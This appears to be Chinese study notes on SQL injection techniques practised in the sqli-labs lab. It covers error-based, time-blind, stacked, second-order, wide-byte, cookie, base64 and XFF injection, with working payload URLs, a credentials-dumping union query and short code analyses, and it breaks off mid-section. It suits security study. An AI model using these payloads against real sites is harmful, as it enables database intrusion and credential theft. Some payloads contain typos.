# 报错注入攻击



[http://whc.dropsec.xyz/2017/04/16/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/](http://whc.dropsec.xyz/2017/04/16/SQL报错注入总结/)

https://www.freebuf.com/column/158705.html

 ```
查库 (select schema_name from information_schema.schemata limit m,n)

查表 (select table_name from information_schema.columns where table_schema=’whc’ limit 0,1)

查字段 (select column_name from information_schema.columns where table_schema=’whc’ limit 0,1)

加上limit 是因为sqllab里面限制了回显的个数，实战里面应该用不到。
 ```

## 1．    Floor 方式

用法：

`select 1,count(*),concat(0x3a,0x3a,(select use()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;`

**函数释义：**

```
rand() 随机数函数 产生0-1的随机数
 count(_) 计数
 floor() 向下取整函数，舍去小数点，比如：floor(1.3)=1
 floor(rand()_2) 结果只有0和1
 group by name 按name的首位字典顺序排列
 concat() 连接括号里面的内容
 select 1 from (table name) 派生表
```

此处有三个点，一是需要count计数，二是floor，取得0 or 1，进行数据的重复，三是group by进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时重复造成的错误。也有解释为mysql 的bug 的问题。但是此处需要将rand(0)，rand()需要多试几次才行。

#### 实列：

在sqli less-5上进行测试

这里只用user()来做实例，其他爆表，爆字段直接代替user()就行了

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g58m9ku4dqj30fe0djju7.jpg)

`id=1' union select 1,count(*),concat(0x3a,0x3a,user(),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+`

可以简化成这样：

`id=1' and  (select count(*) from information_schema.tables group by concat(0x3a,0x3a,version(),0x3a,0x3a,floor(rand(0)*2))) --+`

也可以改成这样：

`id=1' and  (select 1 from (select count(*),(concat(0x3a,user(),0x3a,floor(rand()*2)))name from information_schema.tables group by name)b --+`

语句分解：

```
(select 1 from b) //在b上做派生表

b=select count(_),name from information_schema.tables group by name //从information_schema里面选取那么的内容和计数的内容

name=concat(0x3a,(查询内容),0x3a,floor(rand()_2)) //把:和查询内容，还有随机取整数 连接在一起

具体为什么count(_),floor(rand(0)_2) group by 会报错，必须说这三个元素必须全部放在一个语句里才能报错。
```



解释下` select 1 from table`

它的作用就是 增加临时列，每行的列值是写在select后的数，这条sql语句中是1

`rand(0) rand(1)和rand()的区别`

rand()会随机报错，就是有可能报错，有的时候不会，rand(0)肯定会报错，rand(1)则一定不会报错。

所以要让他报错的话直接用rand(0)

 

 

## 2.xpath函数：

主要的两个函数：

Mysql5.1.5 

1. `updatexml():对xml进行查询和修改`

2. `extractvalue():对xml进行查询和修改`

都是最大爆32位。

`and updatexml(1,concat(0×26,(version()),0×26),1);`

`and (extractvalue(1,concat(0×26,(version()),0×26)));` 

Sqli-lab less5测试:

### Updatexml():

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g58m8ks22gj30fe0djju2.jpg)

`http://192.168.1.180/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x26,database(),0x26),1);--+`

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g58m91j9saj30fe0detbc.jpg)

### Extractvalue():

`http://192.168.1.180/sqli-labs/Less-5/?id=1' and extractvalue(1,concat(0x26,database(),0x26));--+`

# 时间盲注

 它与Boolean注入的不同之处在于，时间注入是利用`sleep()`或`benchmark()`等函数让mysql的执行时间变长。

时间盲注多与`IF（expr1,expr2,expr3）`结合使用，此if语句含义是：如果expr1是`TRUE`，则IF（）的返回值为expr2：否则返回值为expr3，



`http://43.247.91.228:84/Less-9/?id=1’ 

http://43.247.91.228:84/Less-9/?id=1'and if(length(database())>7,sleep(5),1) %23  //判断数据库的库名长度为多少`

`http://43.247.91.228:84/Less-9/?id=1’ and if(substr(database(),1,1)=’s’,sleep(5),1)  //判断数据库名的第一个字`

[在线靶场][http://43.247.91.228:84/Less-9/?id=1]

这里输入?id=1'  ?id=1"页面都没有变化，说明之前的注入方法都没用，包括boolean型盲注也都不行了。

尝试基于时间的盲注，这里需要介绍一个mysql内置的函数`sleep(5) ` 表示执行这个函数时会延迟5秒。（每种数据库都有各自延时函数）

可以用F12看下网站处理这个请求正常需要的时间。

## 验证时间盲注

输入`http://43.247.91.228:84/Less-9/?id=1  `响应时间为1秒内。

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g59iyx8ky3j30sk0drn0z.jpg)

输入：`http://43.247.91.228:84/Less-9/?id=1’ and sleep(5)%23 `响应时间为5秒

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g59izlut3gj30sj0g2tcv.jpg)



利用burp进行抓包利用破解对a-z的字母进行穷举，得到数据库名。

 时间注入代码分析

在时间注入页面中，程序获取GET参数ID，通过preg_match判断参数ID中是否存在Union危险字符，然后将参数ID拼接到SQL语句中。从数据库中查询SQL语句，如果有结果，则返回yes，否则返回no。当访问该页面时，代码根据数据库查询结果返回YES或no，而不返回数据库中的任何数据库，所以一页面上只会显示yes或no ，和Boolean注入不同的是，此处没有过滤sleep等字符，

​    ![](http://ww1.sinaimg.cn/large/007bHQE8gy1g58mmk15ffj30sf0iin29.jpg)                                              

此处当访问id=1‘ and if (ord(substring(user(),1,1))=114,sleep(3),1)%23

由于user()为root，root第一个字符‘r’的ASCII值是114，所以SQL语句中if条件成立，执行sleep(3),页面会延迟3s，通过这种延迟即可判断sql语句的执行结果。

# 堆叠查询注入攻击

堆叠查询可以执行多条语句，多语句之间以分号(;)隔开。堆叠查询注入就是利用这个特点。

`‘;select if(substr(user(),1,1)=’r’,sleep(3),1)%23   //利用堆叠注入获取数据`

`‘;select if(substr((select table_name form information_schema.tables where table_schema=datables() limit 0,1),1,1)=’e’,sleep(3),1)%23 //利用堆载获取表名`

## 堆载查询注入代码分析

 在堆叠注入页面中，程序获取GET参数ID，使用PDO的方式进行数据查询，但仍然将参数ID拼接到查询语句中，导致PDO没有起到预编译的效果，程序仍然存在SQL注入漏洞。

​                       ![](http://ww1.sinaimg.cn/large/007bHQE8gy1g59j1az6twj30pq0bfwhs.jpg)                           

使用POD执行SQL语句时，可以执行多语句，不过这样通常不能直接得到注入结果，因为POD只会返回第一条SQL语句执行的结果，所以在第二条语句中可以用update更新数据或者使用时间盲注获取数据。访问：`dd.php?id=1’;select if(ord(substing(user(),1,1))=114,sleep(3),1);%23`时执行sql语句为：

`SELECT * FROM users where ‘id’ =’1’; select if(ord(substring(user(),1,1))=114,sleep(3),1);%23`

此时SQL语句分为了两条，第一`SELECT * FROM user where ‘id‘ =’1‘`是代码自己的selct查询，而`selct if(ord(substring(user(),1,1))=114,sleep(3),1)%23`则是我们构造的时间盲注的语句。

#  二次注入攻击

### 什么是二次注入?

二次注入是指已存储（数据库，文件）的用户输入被读取后再次进入到SQL查询语句中导致的注入。

二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。

普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。

### 二次注入原理

 

二次注入的原理，在第一次进行数据库插入数据的时候，仅仅只是使用了` addslashes `或者是借助 `get_magic_quotes_gpc `对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是`脏数据`。

在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g59j1uxk8pj30dz07udgk.jpg)

###  二次注入攻击实列

[靶场练习地址][http://43.247.91.228:84/Less-24/]

**二次注入的实例——SQLIlab lesson-24**

学习SQL注入，必定要刷SQLIlab，这里以SQLIlab lesson-24为例，也是考察的二次注入的点。打开题目

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g59j61ymtdj30j607ujss.jpg)

这题正常的流程是首先注册一个账号，然后登陆进去会让你修改新的密码：

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g59j6l6lhpj30j60ahjsj.jpg)

如果直接尝试在登陆处尝试SQL注入，`payload: admin’# `发现失败：

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g59j72dt26j30j608ctcf.jpg)

看一下源代码：

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g59j7viqgxj30j606edjb.jpg)

登陆处的`username`和`password`都经过了`mysql_real_escape_string`函数的转义，直接执行SQL语句会转义’，所以该处无法造成SQL注入。

Ok，此时我们注册一个test’#的账号：

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g59j8d5rakj30j60aj0vn.jpg)

注册用户的时候用了`mysql_escape_string`过滤参数：

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g59j8q6b92j30j60bvte5.jpg)

但是数据库中还是插入了问题数据test’#

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g59j90wtpcj30j60540v3.jpg)

也就是说经过`mysql_escape_string`转义的数据存入数据库后被还原，这里做了一个测试：

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g59j9kx6d7j30j60e6q4q.jpg)

回到题目，此时，test用户的原来密码为test，我们以test’#用户登陆，再进行密码修改

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g59j9z19w3j30j60aedj3.jpg)

我们无需填写current password即可修改test用户的密码：

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g59jahcdl3j30j60513yp.jpg)

我们再看一下test用户的密码：

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g59jaw48cyj30j604zjtx.jpg)

Ok，我们看一下源代码：   

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g59jb55bz2j30j6082djl.jpg)

Username直接从数据库中取出，没有经过转义处理。在更新用户密码的时候其实执行了下面的命令：

`“UPDATEusers SET PASSWORD=’22′ where **username=’test’#**‘ and password=’$curr_pass’”;`

因为我们将问题数据存储到了数据库，而程序再取数据库中的数据的时候没有进行二次判断便直接带入到代码中，从而造成了二次注入；

​                                              

### 二次注入代码分析

以下代码实现了简单的用户注册功能，程序获取到GET参数username和参数password，然后将username和password拼接到SQL语句，使用insert 语句插入数据库中，由于参数username使用addslashes进行转义，参数password进行了MD5哈希，所以此处不存在SQL注入漏洞。

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g59jcsj698j30u70a7dk7.jpg)

当访问`username=test’&password=123456时，`执行的SQL语句为：

`Insert into users(‘username’,’password’) values (‘test\’’,’ E10ADC3949BA59ABBE56E057F20F883E’)`

数据库中就会存在一条名为test‘的用户

# 宽字节注入攻击

### 什么是宽字节注入？

如今有很多人在编码的时候，大多数人对程序的编码都使用unicode编码，网站都使用utf-8来一个统一国际规范。但仍然有很多，包括国内及国外（特别是非英语国家）的一些cms，仍然使用着自己国家的一套编码，比如gbk，作为自己默认的编码类型。也有一些cms为了考虑老用户，所以出了gbk和utf-8两个版本。一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节。

至于mysql宽字节注入的原理就是因为数据库使用了GBK编码

### 宽字节注入原理

GBK 占用两字节

ASCII占用一字节

PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL默认字符集是GBK等宽字节字符集。

大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 %df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。

### 宽字字节注入实列

sqli-32 题

[测试靶场地址][http://43.247.91.228:84/Less-32/?id=1]

思路：

1. 由于单引号被过滤了，所以我们使用`%df`吃掉 \， 具体的原因是`urlencode(\') = %5c%27`，我们在`%5c%27`前面添加`%df`，形成`%df%5c%27`，而上面提到的mysql在GBK编码方式的时候会将两个字节当做一个汉字，此事`%df%5c`就是一个汉字，%27则作为一个单独的符号在外面，同时也就达到了我们的目的。

2. 将 \' 中的 \ 过滤掉，例如可以构造 `%**%5c%5c%27`的情况，后面的`%5c`会被前面的`%5c`给注释掉。这也是bypass的一种方法。

注入实操：

（1）            构造代码，成功绕过，payload如下：

`http://localhost:81/sqli-labs-master/Less-32/index.php?id=1%df%27 and 1=1--+`

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g59jeslilcj30pz0aijs4.jpg)

（2）order by查询字段数

`http://localhost:81/sqli-labs-master/Less-32/index.php?id=1%df%27 order by 4--+`

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g59jf58fymj30lx09ijs2.jpg)

(3)union selec联合查询

`http://localhost:81/sqli-labs-master/Less-32/index.php?id=0%df%27 union select 1,2,3--+`

 ![](http://ww1.sinaimg.cn/large/007bHQE8gy1g59jfixqrnj30p009zaas.jpg)

其他的都是一样的了、。。。。。。。。。。。

`http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 and 1=1--+`

`http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 and 1=1--+`

`http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 oder by 3--+`

`http://localhost:81/sqli-labs-master/Less-33/index.php?id=0%df%5c%27 union select 1,2,3--+`

`http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 union select 1,database(),3--+`

`http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+`

`http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3--+`

`http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 union select 1,(select group_concat(username,password) from users),3--+`



### 宽字节注入代码分析

在宽字节注入页面中，程序获取GET参数ID，并对参数ID使用addslashes()转义，然后拼接到SQL语句中，进行查询;

   ![](http://ww1.sinaimg.cn/large/007bHQE8gy1g59j2q9evyj30t50l87ak.jpg)

当访问id=1‘时，执行的SQL语句：

`SELECT * FORM users WHWRE id=’1\’’`

可以看到单引号被转义符“\”转义，所以在一般情况下，是无法注入的，但由于在数据库查询前执行了SET NAMES ‘GBK’,将编码设置为宽字节GBK，所以此处存在宽字节注入漏洞，

在php中，通过iconv（）进行编码转换时，也可能存在宽字符注入漏洞。

 

# Cookie 注入攻击

通常我们的开发人员在开发过程中会特别注意到防止恶意用户进行恶意的注入操作，因此会对传入的参数进行适当的过滤，但是很多时候，由于个人对安全技术了解的不同，有些开发人员只会对get,post这种方式提交的数据进行参数过滤。

 

但我们知道，很多时候，提交数据并非仅仅只有get\post这两种方式，还有一种经常被用到的方式：request("xxx"),即request方法

 

通过这种方法一样可以从用户提交的参数中获取参数值，这就造成了cookie注入的最基本条件：使用了request方法，但是注入保护程序中只对get\post方法提交的数据进行了过滤。



### Cookie注入攻击实列

[靶场地址][http://43.247.91.228:84/Less-20/]

这关是一个Cookie处的注入,输入正确的账号密码后，会跳到index.php页面，如下图

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g59jgll6snj30se0c8wjp.jpg)

这个时候再访问登陆页面的时候http://43.247.91.228:84/Less-20/还是上面的页面，因为登陆后将信息存在了Cookie中，后台进行判断，发现Cookie中有值时会显示上面的个人信息，而不是登录框。
 在上面哪些信息中可以看到，多出了一个Your ID：8，这个信息很有可能是从数据库中查询出来的，我们再次访问该页面，使用burp抓包分析

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g59jh03js9j30f606eq3g.jpg)

可以看到Cookie中有uname=admin，说明后台很有可能利用cookie中的uname取数据库中进行查询操作。

将cookie中的信息改为uname=admin'

![1563847098575](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1563847098575.png)

 

页面报错了，并且从报错信息中可以看出，后台使用的是单引号进行的拼凑。后面没有必要继续下去了，联表查询、报错注入、盲注在这里都是可以的。

继续使用burp进`Cookie: uname=admin' AND UpdateXml(1,concat(0x7e,(select username from users LIMIT 1,1),0x7e),1)# ;`

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g59jhq7uraj30z20gudlz.jpg)

得到：

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g59jimmxauj30cu00r744.jpg)

 

 

## Cookie  注入代码分析

通过$_COOKIE能获取浏览器cookie中的数据，在cookie注入页面中程序通过$_COOKIE获取参数ID，然后直接将ID拼接到slect语句中进行查询，如果有结果则将结果输出到页面。   

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g59j3eecanj30su0dq797.jpg)

这里可以看到，由于没有过滤cookie中的参数ID且直接拼接到SQL语句中，所以存在SQL注入漏洞。当在cookie中添加id=1 union select 1,2,3%23时，执行的SQL语句为：

 

Select * from users where ‘id’=1 union select 1,2,3#

此时,SQL语句可以分为select * from users where ‘id’ =1 和 union select 1,2,3两条，利用第二条语句就可以获取数据库中的数据。

 

# Base64 注入攻击

 

## Base64 注入代码分析

在base64 注入页面中，程序获取GET参数ID，利用base64_decode()对参数ID进行base64解码，然后直接将解码后的$id拼接到select语句中进行查询，通过while循环将查询结果输出到页面。

   ![](http://ww1.sinaimg.cn/large/007bHQE8gy1g59j3uusm1j30nz0emgqy.jpg)

由于代码没有过滤解码后的$id,且将$id直接拼接到SQL语句中，所以存在SQL注入漏洞。当访问`id=1 union select 1,2,3#`时，执行的SQL语句为：

`Select * from users wheren ‘id’=1 union select 1,2,3#`

此时SQL语句可以分为`select * form users where ‘id’=1和union select 1,2,3`两条，利用第二条语句就可以获取数据库中的数据。

# XFF注入攻击

 

## XFF注入代码分析

PHP 中的getenv()函数用于获取一个环境变量的值，类似于$_SERVER或$_ENV,返回环境变量对应的值，如果环境变量不存在则返回FALSE。

使用以下代码即可获取客户端IP地址，程序先判断是否存在HTTP头部参数
